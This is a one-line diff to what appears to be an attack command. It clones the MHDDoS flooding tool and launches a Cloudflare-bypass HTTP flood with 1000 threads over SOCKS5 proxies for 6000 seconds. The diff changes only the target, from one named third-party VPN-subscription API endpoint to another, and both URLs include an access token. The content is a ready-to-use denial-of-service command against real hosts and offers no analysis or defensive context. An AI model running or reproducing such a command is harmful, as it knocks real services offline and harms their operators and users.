@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://v2gfw.com/api/v1/client/subscribe?token=4d63bd972e7ee04a13d84e8839eb0fe0&flag=shadowrocket'  5  1000 socks5.txt  100 6000
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://hatsunefly.xyz/api/v1/client/subscribe?token=4d63bd972e7ee04a13d84e8839eb0fe0&flag=shadowrocket'  5  1000 socks5.txt  100 6000
